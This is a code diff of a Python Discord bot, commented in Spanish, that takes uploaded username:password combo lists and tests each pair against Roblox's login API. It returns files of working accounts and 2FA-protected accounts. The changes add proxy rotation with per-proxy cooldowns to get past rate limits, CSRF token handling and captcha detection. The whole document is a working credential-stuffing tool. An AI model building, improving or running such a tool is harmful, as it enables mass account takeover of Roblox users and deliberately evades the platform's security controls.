@@ -25,8 +25,13 @@ CONCURRENCY = max(1, int(os.getenv("CONCURRENCY", "20")))
 TIMEOUT = float(os.getenv("TIMEOUT", "20"))
 MAX_COMBOS = 50_000
 MAX_FILE = 8 * 1024 * 1024
-MAX_RETRY_AFTER = 90.0
+MAX_RETRY_AFTER = 30.0
+PROXY_PENALTY = 8.0
+STALL_WARN = 60
 EDIT_EVERY = 1.5
+
+LOG_MAX = 5000
+LOG_BLOCK = 950
 
 LOGIN_URL = "https://auth.roblox.com/v2/login"
 UA = (
@@ -71,28 +76,40 @@ def _parse_proxies(raw: str) -> list[str]:
 
 
 PROXIES = _parse_proxies(RAW_PROXIES)
+PROXY_COOLDOWN: dict[str, float] = {}
+GLOBAL_COOLDOWN = 0.0
 _proxy_i = 0
-COOLDOWN_UNTIL = 0.0
 
 
 def next_proxy() -> str | None:
     global _proxy_i
     if not PROXIES:
         return None
-    _proxy_i = (_proxy_i + 1) % len(PROXIES)
-    return PROXIES[_proxy_i]
+    ahora = time.monotonic()
+    for _ in range(len(PROXIES)):
+        _proxy_i = (_proxy_i + 1) % len(PROXIES)
+        p = PROXIES[_proxy_i]
+        if PROXY_COOLDOWN.get(p, 0) <= ahora:
+            return p
+    return min(PROXIES, key=lambda p: PROXY_COOLDOWN.get(p, 0))
 
 
-async def wait_cooldown():
+def penalizar(proxy: str | None, segundos: float):
+    if proxy:
+        PROXY_COOLDOWN[proxy] = max(PROXY_COOLDOWN.get(proxy, 0), time.monotonic() + segundos)
+
+
+async def wait_cooldown(proxy: str | None):
     while True:
-        left = COOLDOWN_UNTIL - time.monotonic()
+        ahora = time.monotonic()
+        hasta = max(GLOBAL_COOLDOWN, PROXY_COOLDOWN.get(proxy, 0) if proxy else 0)
+        left = hasta - ahora
         if left <= 0:
             return
         await asyncio.sleep(min(left, 1.5))
 
 
 def retry_delay(r: aiohttp.ClientResponse) -> float:
-    """Tiempo que Roblox pide esperar, en segundos."""
     for header in ("retry-after", "x-ratelimit-reset", "x-ratelimit-reset-seconds"):
         raw = r.headers.get(header)
         if not raw:
@@ -108,7 +125,7 @@ def retry_delay(r: aiohttp.ClientResponse) -> float:
                 return min(max(delta, 0.5), MAX_RETRY_AFTER)
             except Exception:
                 continue
-    return 5.0
+    return 4.0
 
 
 # ------------------------------------------------------------------ combos
@@ -145,7 +162,6 @@ def es_usuario(valor: str) -> bool:
 
 
 def parse_combos(texto: str) -> tuple[list[tuple[str, str]], int]:
-    """Devuelve (combos_válidos, ignoradas). Nunca lanza."""
     vistos = set()
     validos: list[tuple[str, str]] = []
     ignoradas = 0
@@ -156,27 +172,22 @@ def parse_combos(texto: str) -> tuple[list[tuple[str, str]], int]:
         except Exception:
             ignoradas += 1
             continue
-
         if not linea or linea.lower().startswith(BASURA):
             ignoradas += 1
             continue
-
         partes = _separar(linea)
         if not partes:
             ignoradas += 1
             continue
-
         user, pw = partes
         if not es_usuario(user) or not PASSWORD_RE.match(pw):
             ignoradas += 1
             continue
-
         clave = (user.lower(), pw)
         if clave in vistos:
             ignoradas += 1
             continue
         vistos.add(clave)
-
         validos.append((user, pw))
         if len(validos) >= MAX_COMBOS:
             break
@@ -185,7 +196,8 @@ def parse_combos(texto: str) -> tuple[list[tuple[str, str]], int]:
 
 
 def build_file(lines: list[str], name: str) -> discord.File:
-    buf = io.BytesIO(("\n".join(lines) + "\n").encode("utf-8"))
+    texto = "\n".join(lines) + "\n"
+    buf = io.BytesIO(texto.encode("utf-8")[:2_000_000])
     return discord.File(buf, filename=name)
 
 
@@ -196,42 +208,25 @@ def barra(done: int, total: int, ancho: int = 16) -> str:
     return "█" * filled + "░" * (ancho - filled)
 
 
-# ------------------------------------------------------------------ workers
+# ------------------------------------------------------------------ worker
 class Worker:
     __slots__ = ("session", "csrf")
 
     def __init__(self):
         self.session = aiohttp.ClientSession(
             headers=BASE_HEADERS,
-            timeout=aiohttp.ClientTimeout(total=TIMEOUT),
-            connector=aiohttp.TCPConnector(ssl=False, limit=2),
+            timeout=aiohttp.ClientTimeout(total=TIMEOUT, connect=8),
+            connector=aiohttp.TCPConnector(ssl=False, limit=4),
             cookie_jar=aiohttp.CookieJar(unsafe=True),
         )
-        self.csrf = None
-
-
-class Pool:
-    def __init__(self, size: int):
-        self._q: asyncio.Queue[Worker] = asyncio.Queue()
-        self._all = [Worker() for _ in range(size)]
-        for w in self._all:
-            self._q.put_nowait(w)
-
-    async def acquire(self) -> Worker:
-        return await self._q.get()
-
-    def release(self, w: Worker):
-        self._q.put_nowait(w)
+        self.csrf: dict[str, str] = {}
 
     async def close(self):
-        for w in self._all:
-            await w.session.close()
+        if not self.session.closed:
+            await self.session.close()
 
 
 async def check_one(w: Worker, user: str, pw: str) -> dict:
-    """Devuelve {'status': valid|2fa|bad|error, ...}"""
-    global COOLDOWN_UNTIL
-
     ctype = "Email" if "@" in user else "Username"
     payload = {"ctype": ctype, "cvalue": user, "password": pw}
 
@@ -239,14 +234,18 @@ async def check_one(w: Worker, user: str, pw: str) -> dict:
     esperas_rl = 0
 
     while intentos < 3:
-        await wait_cooldown()
         proxy = next_proxy()
-        try:
-            if not w.csrf:
-                async with w.session.post(LOGIN_URL, json={}, proxy=proxy) as r:
-                    w.csrf = r.headers.get("x-csrf-token")
+        await wait_cooldown(proxy)
 
-            headers = {"x-csrf-token": w.csrf} if w.csrf else {}
+        try:
+            csrf = w.csrf.get(proxy or "")
+            if not csrf:
+                async with w.session.post(LOGIN_URL, json={}, proxy=proxy) as r:
+                    csrf = r.headers.get("x-csrf-token")
+                    if csrf:
+                        w.csrf[proxy or ""] = csrf
+
+            headers = {"x-csrf-token": csrf} if csrf else {}
 
             async with w.session.post(
                 LOGIN_URL, json=payload, headers=headers, proxy=proxy
@@ -266,9 +265,9 @@ async def check_one(w: Worker, user: str, pw: str) -> dict:
                     }
 
                 if status == 403:
-                    new_csrf = r.headers.get("x-csrf-token")
-                    if new_csrf:
-                        w.csrf = new_csrf
+                    nuevo = r.headers.get("x-csrf-token")
+                    if nuevo:
+                        w.csrf[proxy or ""] = nuevo
 
                     ctype_h = (r.headers.get("rblx-challenge-type") or "").lower()
                     challenge = r.headers.get("rblx-challenge-id")
@@ -278,62 +277,68 @@ async def check_one(w: Worker, user: str, pw: str) -> dict:
                         return {"status": "2fa"}
 
                     if challenge or "captcha" in body or "challenge" in body:
-                        return {"status": "bad", "note": "captcha"}
+                        return {"status": "bad", "note": "captcha", "log": "captcha"}
 
                     if intentos < 2:
                         intentos += 1
-                        w.csrf = None
+                        w.csrf.pop(proxy or "", None)
                         continue
-                    return {"status": "bad", "note": "challenge"}
+                    return {"status": "bad", "note": "challenge", "log": "challenge"}
 
                 if status in (400, 401):
                     return {"status": "bad"}
 
-                if status in (429, 503) and status == 429:
+                if status == 429:
                     esperas_rl += 1
-                    if esperas_rl > 6:
-                        return {"status": "error", "note": "rate limit"}
                     delay = retry_delay(r)
-                    COOLDOWN_UNTIL = max(COOLDOWN_UNTIL, time.monotonic() + delay)
-                    await asyncio.sleep(delay)
+                    penalizar(proxy, delay)
+                    if delay >= 15:
+                        globals()["GLOBAL_COOLDOWN"] = max(
+                            GLOBAL_COOLDOWN, time.monotonic() + min(delay, MAX_RETRY_AFTER)
+                        )
+                    if esperas_rl > 4:
+                        return {
+                            "status": "error",
+                            "note": "rate limit",
+                            "log": f"429 x{esperas_rl} en {proxy or 'directo'}",
+                        }
                     continue
 
                 if status >= 500:
                     if intentos < 2:
                         intentos += 1
-                        await asyncio.sleep(1.0 + intentos)
+                        penalizar(proxy, 3)
                         continue
-                    return {"status": "error", "note": f"HTTP {status}"}
+                    return {"status": "error", "note": f"HTTP {status}", "log": f"HTTP {status}"}
 
-                return {"status": "error", "note": f"HTTP {status}"}
+                return {"status": "error", "note": f"HTTP {status}", "log": f"HTTP {status}"}
 
         except asyncio.TimeoutError:
+            penalizar(proxy, PROXY_PENALTY)
             if intentos < 2:
                 intentos += 1
                 continue
-            return {"status": "error", "note": "timeout"}
+            return {"status": "error", "note": "timeout", "log": f"timeout {proxy or 'directo'}"}
         except aiohttp.ClientError as e:
+            penalizar(proxy, PROXY_PENALTY)
             if intentos < 2:
                 intentos += 1
                 continue
-            return {"status": "error", "note": type(e).__name__}
+            return {
+                "status": "error",
+                "note": type(e).__name__,
+                "log": f"{type(e).__name__} {proxy or 'directo'}",
+            }
         except Exception as e:
-            return {"status": "error", "note": str(e)[:60]}
+            return {"status": "error", "note": str(e)[:60], "log": repr(e)[:120]}
 
-    return {"status": "error", "note": "sin respuesta"}
+    return {"status": "error", "note": "sin respuesta", "log": "sin respuesta"}
 
 
 # ------------------------------------------------------------------ job
 class Job:
-    def __init__(
-        self,
-        owner: int,
-        combos: list[tuple[str, str]],
-        pool: Pool,
-        ignoradas: int = 0,
-    ):
+    def __init__(self, owner: int, combos: list[tuple[str, str]], ignoradas: int = 0):
         self.owner = owner
-        self.pool = pool
         self.pending = deque(combos)
         self.total = len(combos)
         self.ignoradas = ignoradas
@@ -344,19 +349,32 @@ class Job:
         self.twofa: list[str] = []
         self.bad: list[str] = []
         self.errors: list[str] = []
+        self.logs: deque[str] = deque(maxlen=LOG_MAX)
+        self.contadores = {"429": 0, "captcha": 0, "timeout": 0, "proxy": 0, "http": 0, "fatal": 0}
+        self.ultimo_avance = time.monotonic()
         self.paused = asyncio.Event()
         self.paused.set()
         self.stopped = False
         self.finished = False
-        self.started = time.monotonic()
         self.message: discord.Message | None = None
+        self.err_message: discord.Message | None = None
         self.view: "JobView | None" = None
         self.workers: list[asyncio.Task] = []
+        self.sesiones: list[Worker] = []
         self._editor: asyncio.Task | None = None
+        self._watchdog: asyncio.Task | None = None
 
     @property
     def done(self) -> int:
         return len(self.good) + len(self.twofa) + len(self.bad) + len(self.errors)
+
+    def log(self, tipo: str, mensaje: str):
+        self.logs.append(f"[{time.strftime('%H:%M:%S')}] {tipo:<7} {mensaje}")
+        clave = tipo.lower()
+        if clave in self.contadores:
+            self.contadores[clave] += 1
+        elif tipo in ("429", "FATAL"):
+            self.contadores["429" if tipo == "429" else "fatal"] += 1
 
     async def _record(self, user: str, pw: str, res: dict):
         combo = f"{user}:{pw}"
@@ -369,36 +387,68 @@ class Job:
             self.bad.append(combo)
         else:
             self.errors.append(f"{combo}  # {res.get('note', 'error')}")
+        if res.get("log"):
+            tipo = "429" if "429" in res["log"] else res["status"].upper()
+            self.log(tipo, f"{user} · {res['log']}")
         self.checked += 1
+        self.ultimo_avance = time.monotonic()
 
     async def _worker(self):
-        while True:
-            await self.paused.wait()
-            if self.stopped:
-                return
-            try:
-                user, pw = self.pending.popleft()
-            except IndexError:
-                return
-            self.current = f"{user}:{pw}"
-            self.inflight += 1
-            w = await self.pool.acquire()
-            try:
-                res = await check_one(w, user, pw)
-            finally:
-                self.pool.release(w)
-                self.inflight -= 1
-            await self._record(user, pw, res)
+        w = Worker()
+        self.sesiones.append(w)
+        try:
+            while True:
+                await self.paused.wait()
+                if self.stopped:
+                    return
+                try:
+                    user, pw = self.pending.popleft()
+                except IndexError:
+                    return
+                self.current = f"{user}:{pw}"
+                self.inflight += 1
+                try:
+                    res = await check_one(w, user, pw)
+                finally:
+                    self.inflight -= 1
+                await self._record(user, pw, res)
+        finally:
+            await w.close()
 
     async def run(self):
-        await asyncio.gather(
-            *(self._worker() for _ in range(min(CONCURRENCY, max(self.total, 1))))
-        )
-        if self.stopped:
-            return
-        if not self.pending:
-            self.finished = True
-            await self.refresh(final=True)
+        n = min(CONCURRENCY, max(self.total, 1))
+        try:
+            await asyncio.gather(*(self._worker() for _ in range(n)))
+        except Exception as e:
+            self.log("FATAL", repr(e)[:150])
+            self.stopped = True
+        finally:
+            for w in self.sesiones:
+                try:
+                    await w.close()
+                except Exception:
+                    pass
+            if not self.stopped and not self.pending:
+                self.finished = True
+            elif not self.pending:
+                self.finished = True
+            await self.refresh()
+
+    async def watchdog(self):
+        avisado = 0.0
+        while not self.finished:
+            await asyncio.sleep(10)
+            quieto = time.monotonic() - self.ultimo_avance
+            if quieto >= STALL_WARN and quieto - avisado >= STALL_WARN:
+                avisado = quieto
+                ahora = time.monotonic()
+                bloqueados = sum(1 for t in PROXY_COOLDOWN.values() if t > ahora)
+                self.log(
+                    "WARN",
+                    f"sin avance {int(quieto)}s · {bloqueados}/{len(PROXIES)} proxies en espera "
+                    f"· global {max(GLOBAL_COOLDOWN - ahora, 0):.0f}s",
+                )
+                await self.refresh()
 
     def embed(self, final: bool = False) -> discord.Embed:
         pct = self.done * 100 // max(self.total, 1)
@@ -408,54 +458,79 @@ class Job:
         )
         e.add_field(name="Archivo", value=f"**{self.total:,}** combos", inline=True)
         e.add_field(name="Checkeados", value=f"**{self.done:,}** ({pct}%)", inline=True)
-        e.add_field(
-            name="Restantes", value=f"**{max(self.total - self.done, 0):,}**", inline=True
-        )
+        e.add_field(name="Restantes", value=f"**{max(self.total - self.done, 0):,}**", inline=True)
         e.add_field(name="Progreso", value=f"`{barra(self.done, self.total)}`", inline=False)
         e.add_field(name="Buenas", value=f"`{len(self.good)}`", inline=True)
         e.add_field(name="2FA", value=f"`{len(self.twofa)}`", inline=True)
         e.add_field(name="Malas", value=f"`{len(self.bad) + len(self.errors)}`", inline=True)
         if self.ignoradas:
-            e.add_field(
-                name="Ignoradas",
-                value=f"`{self.ignoradas:,}` líneas sin formato",
-                inline=False,
-            )
-        e.add_field(
-            name="Cuenta actual",
-            value=f"```{(self.current or '-')[:80]}```",
-            inline=False,
-        )
+            e.add_field(name="Ignoradas", value=f"`{self.ignoradas:,}` líneas sin formato", inline=False)
+        e.add_field(name="Cuenta actual", value=f"```{(self.current or '-')[:80]}```", inline=False)
         if self.finished:
             estado = "Terminado"
         elif self.stopped:
             estado = "Detenido"
-        elif not self.paused.is_set():
-            estado = "Pausado"
         else:
             estado = "Checkeando"
-        e.set_footer(
-            text=f"{estado} · {self.inflight} en vuelo · {CONCURRENCY} hilos · {len(PROXIES)} proxies"
+        e.set_footer(text=f"{estado} · {self.inflight} en vuelo · {CONCURRENCY} hilos · {len(PROXIES)} proxies")
+        return e
+
+    def errors_embed(self) -> discord.Embed:
+        c = self.contadores
+        e = discord.Embed(title="Registro de errores", colour=0xE74C3C)
+        e.add_field(name="429 / bloqueos", value=f"`{c['429']}`", inline=True)
+        e.add_field(name="Captchas", value=f"`{c['captcha']}`", inline=True)
+        e.add_field(name="Timeouts", value=f"`{c['timeout']}`", inline=True)
+        e.add_field(name="Fallos de proxy", value=f"`{c['proxy']}`", inline=True)
+        e.add_field(name="HTTP raros", value=f"`{c['http']}`", inline=True)
+        e.add_field(name="Fatales", value=f"`{c['fatal']}`", inline=True)
+
+        ahora = time.monotonic()
+        libres = sum(1 for p in PROXIES if PROXY_COOLDOWN.get(p, 0) <= ahora)
+        e.add_field(
+            name="Proxies",
+            value=f"`{libres}/{len(PROXIES)}` libres · global `{max(GLOBAL_COOLDOWN - ahora, 0):.0f}s`",
+            inline=False,
         )
+
+        if self.logs:
+            texto = "\n".join(list(self.logs)[-30:])
+            trozos, actual = [], ""
+            for linea in texto.splitlines():
+                if len(actual) + len(linea) + 1 > LOG_BLOCK:
+                    trozos.append(actual)
+                    actual = ""
+                actual += linea + "\n"
+            if actual:
+                trozos.append(actual)
+            for i, trozo in enumerate(trozos[:2], 1):
+                e.add_field(
+                    name=f"Últimos eventos ({i}/{min(len(trozos), 2)})",
+                    value=f"```{trozo.strip()[:LOG_BLOCK]}```",
+                    inline=False,
+                )
+        else:
+            e.add_field(name="Últimos eventos", value="Sin eventos todavía.", inline=False)
+
+        e.set_footer(text="Los archivos se entregan solo a quien lanzó el checkeo")
         return e
 
     async def refresh(self, final: bool = False):
-        if not self.message:
-            return
-        try:
-            await self.message.edit(embed=self.embed(final), view=self.view)
-        except Exception:
-            pass
+        for msg, emb in ((self.message, self.embed(final)), (self.err_message, self.errors_embed())):
+            if not msg:
+                continue
+            try:
+                await msg.edit(embed=emb)
+            except Exception:
+                pass
 
     async def editor_loop(self):
         while not self.finished:
             await asyncio.sleep(EDIT_EVERY)
             await self.refresh()
-            if self.stopped and self.inflight == 0:
-                await self.refresh()
 
 
-# ------------------------------------------------------------------ vista
+# ------------------------------------------------------------------ vistas
 class JobView(discord.ui.View):
     def __init__(self, job: Job):
         super().__init__(timeout=None)
@@ -463,9 +538,7 @@ class JobView(discord.ui.View):
 
     async def _guard(self, it: discord.Interaction) -> bool:
         if it.user.id != self.job.owner:
-            await it.response.send_message(
-                "Este checkeo no lo iniciaste tú.", ephemeral=True
-            )
+            await it.response.send_message("Este checkeo no lo iniciaste tú.", ephemeral=True)
             return False
         return True
 
@@ -477,41 +550,19 @@ class JobView(discord.ui.View):
             return
         await it.response.send_message(file=build_file(lines, name), ephemeral=True)
 
-    @discord.ui.button(
-        label="Descargar buenas",
-        style=discord.ButtonStyle.success,
-        custom_id="rbx_good",
-        row=0,
-    )
+    @discord.ui.button(label="Descargar buenas", style=discord.ButtonStyle.success, custom_id="rbx_good", row=0)
     async def good(self, it: discord.Interaction, _):
         await self._send(it, self.job.good, "buenas.txt", "Todavía no hay cuentas buenas.")
 
-    @discord.ui.button(
-        label="Descargar 2FA",
-        style=discord.ButtonStyle.primary,
-        custom_id="rbx_2fa",
-        row=0,
-    )
+    @discord.ui.button(label="Descargar 2FA", style=discord.ButtonStyle.primary, custom_id="rbx_2fa", row=0)
     async def twofa(self, it: discord.Interaction, _):
         await self._send(it, self.job.twofa, "2fa.txt", "Todavía no hay cuentas con 2FA.")
 
-    @discord.ui.button(
-        label="Descargar malas",
-        style=discord.ButtonStyle.danger,
-        custom_id="rbx_bad",
-        row=0,
-    )
+    @discord.ui.button(label="Descargar malas", style=discord.ButtonStyle.danger, custom_id="rbx_bad", row=0)
     async def bad(self, it: discord.Interaction, _):
-        await self._send(
-            it, self.job.bad + self.job.errors, "malas.txt", "Todavía no hay cuentas malas."
-        )
+        await self._send(it, self.job.bad + self.job.errors, "malas.txt", "Todavía no hay cuentas malas.")
 
-    @discord.ui.button(
-        label="Detener",
-        style=discord.ButtonStyle.secondary,
-        custom_id="rbx_stop",
-        row=0,
-    )
+    @discord.ui.button(label="Detener", style=discord.ButtonStyle.secondary, custom_id="rbx_stop", row=0)
     async def stop(self, it: discord.Interaction, _):
         if not await self._guard(it):
             return
@@ -523,17 +574,11 @@ class JobView(discord.ui.View):
             return
         self.job.stopped = True
         self.job.paused.set()
-        await it.response.send_message(
-            "Detenido. Usa **Seguir** para reanudar.", ephemeral=True
-        )
+        self.job.log("WARN", "detenido por el usuario")
+        await it.response.send_message("Detenido. Usa **Seguir** para reanudar.", ephemeral=True)
         await self.job.refresh()
 
-    @discord.ui.button(
-        label="Seguir",
-        style=discord.ButtonStyle.secondary,
-        custom_id="rbx_resume",
-        row=0,
-    )
+    @discord.ui.button(label="Seguir", style=discord.ButtonStyle.secondary, custom_id="rbx_resume", row=0)
     async def resume(self, it: discord.Interaction, _):
         if not await self._guard(it):
             return
@@ -545,6 +590,8 @@ class JobView(discord.ui.View):
             return
         self.job.stopped = False
         self.job.paused.set()
+        self.job.ultimo_avance = time.monotonic()
+        self.job.log("WARN", "reanudado por el usuario")
         vivos = [t for t in self.job.workers if not t.done()]
         if not vivos and self.job.pending:
             self.job.workers = [asyncio.create_task(self.job.run())]
@@ -552,10 +599,34 @@ class JobView(discord.ui.View):
         await self.job.refresh()
 
 
+class ErrorsView(discord.ui.View):
+    def __init__(self, job: Job):
+        super().__init__(timeout=None)
+        self.job = job
+
+    @discord.ui.button(label="Descargar errores", style=discord.ButtonStyle.secondary, custom_id="rbx_errlog")
+    async def descargar(self, it: discord.Interaction, _):
+        if it.user.id != self.job.owner:
+            await it.response.send_message("Este checkeo no lo iniciaste tú.", ephemeral=True)
+            return
+        if not self.job.logs:
+            await it.response.send_message("No hay errores registrados.", ephemeral=True)
+            return
+        cabecera = [
+            f"Combos: {self.job.total}",
+            f"Checkeados: {self.job.done}",
+            f"429: {self.job.contadores['429']} | captchas: {self.job.contadores['captcha']} "
+            f"| timeouts: {self.job.contadores['timeout']} | proxies: {self.job.contadores['proxy']}",
+            "-" * 40,
+        ]
+        await it.response.send_message(
+            file=build_file(cabecera + list(self.job.logs), "errores.txt"), ephemeral=True
+        )
+
+
 # ------------------------------------------------------------------ bot
 intents = discord.Intents.default()
 bot = commands.Bot(command_prefix="!", intents=intents)
-pool: Pool | None = None
 ACTIVE: set[int] = set()
 
 
@@ -570,24 +641,15 @@ async def sync_guild(guild: discord.Guild):
 
 @bot.event
 async def on_ready():
-    global pool
-    if pool is None:
-        pool = Pool(CONCURRENCY)
-
     try:
         synced = await bot.tree.sync()
         print(f"Comandos globales sincronizados: {len(synced)}")
     except discord.HTTPException as e:
         print(f"Error en sync global: {e}")
-
     for guild in bot.guilds:
         await sync_guild(guild)
         await asyncio.sleep(1)
-
-    print(
-        f"Listo: {bot.user} | {len(bot.guilds)} servidores | "
-        f"{len(PROXIES)} proxies | {CONCURRENCY} hilos"
-    )
+    print(f"Listo: {bot.user} | {len(bot.guilds)} servidores | {len(PROXIES)} proxies | {CONCURRENCY} hilos")
 
 
 @bot.event
@@ -604,11 +666,8 @@ async def on_guild_remove(guild: discord.Guild):
 @app_commands.describe(file="Archivo .txt con un combo por línea (user:pass)")
 async def rbx_checker(interaction: discord.Interaction, file: discord.Attachment):
     if interaction.user.id in ACTIVE:
-        await interaction.response.send_message(
-            "Ya tienes un checkeo en curso.", ephemeral=True
-        )
+        await interaction.response.send_message("Ya tienes un checkeo en curso.", ephemeral=True)
         return
-
     if file.size > MAX_FILE:
         await interaction.response.send_message("El archivo pasa de 8 MB.", ephemeral=True)
         return
@@ -633,31 +692,32 @@ async def rbx_checker(interaction: discord.Interaction, file: discord.Attachment
 
     ACTIVE.add(interaction.user.id)
 
-    job = Job(interaction.user.id, combos, pool, ignoradas)
+    job = Job(interaction.user.id, combos, ignoradas)
     job.view = JobView(job)
-    job.workers = [asyncio.create_task(job.run())]
 
     await interaction.edit_original_response(embed=job.embed(), view=job.view)
     job.message = await interaction.original_response()
+
+    job.err_message = await interaction.followup.send(
+        embed=job.errors_embed(), view=ErrorsView(job), wait=True
+    )
+
+    job.workers = [asyncio.create_task(job.run())]
     job._editor = asyncio.create_task(job.editor_loop())
+    job._watchdog = asyncio.create_task(job.watchdog())
 
     async def cleanup():
         while not job.finished:
             await asyncio.sleep(2)
         ACTIVE.discard(job.owner)
         await asyncio.sleep(1800)
-        try:
-            await job.message.edit(view=None)
-        except Exception:
-            pass
+        for msg in (job.message, job.err_message):
+            try:
+                await msg.edit(view=None)
+            except Exception:
+                pass
 
     asyncio.create_task(cleanup())
-
-
-@bot.event
-async def on_close():
-    if pool:
-        await pool.close()
 
 
 if __name__ == "__main__":
